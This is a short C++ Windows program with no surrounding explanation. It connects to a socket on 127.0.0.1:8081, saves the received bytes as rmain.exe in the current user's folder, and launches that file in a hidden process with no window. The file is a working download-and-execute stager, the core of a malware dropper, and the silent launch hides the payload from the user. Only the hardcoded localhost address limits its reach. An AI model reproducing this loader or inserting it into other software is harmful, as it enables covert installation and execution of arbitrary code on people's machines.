#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#pragma comment(lib, "Ws2_32.lib")
#include <Lmcons.h>
using namespace std;
int run()
{
    wchar_t username[UNLEN + 1];
    DWORD usernameLength = UNLEN + 1;
    GetUserNameW(username, &usernameLength);

    std::wstring path = L"C:/Users/" + std::wstring(username) + L"/rmain.exe";

    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; 

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

  
    if (!CreateProcess(nullptr, const_cast<LPWSTR>(path.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
   
        cout << "Failed to start process: " << GetLastError() << endl;
        return 1;
    }

    DWORD pid = pi.dwProcessId;
    cout << "Process started with PID: " << pid << endl;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
int main()
{

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed." << std::endl;
        return 1;
    }


    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        std::cerr << "Failed to create socket." << std::endl;
        WSACleanup();
        return 1;
    }


    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8081);
    if (inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr) != 1)
    {
        std::cerr << "Invalid address." << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // サーバーへ接続
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR)
    {
        std::cerr << "Failed to connect to the server." << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    constexpr int BUFFER_SIZE = 1024;
    char buffer[BUFFER_SIZE];


    wchar_t username[UNLEN + 1];
    DWORD usernameLength = UNLEN + 1;


    GetUserNameW(username, &usernameLength);


    std::wstring wsUsername(username);


    std::string usernameStr(wsUsername.begin(), wsUsername.end());

 
    std::string filePath = "C:/Users/" + usernameStr + "/rmain.exe";
    cout << filePath << "\n";
    std::ofstream file(filePath, std::ios::binary);
    while (true) {
        int n = recv(sock, buffer, BUFFER_SIZE, 0);
        if (n <= 0) {
            break;
        }
        file.write(buffer, n);
    }
    file.close();
    closesocket(sock);


    WSACleanup();
    run();
}
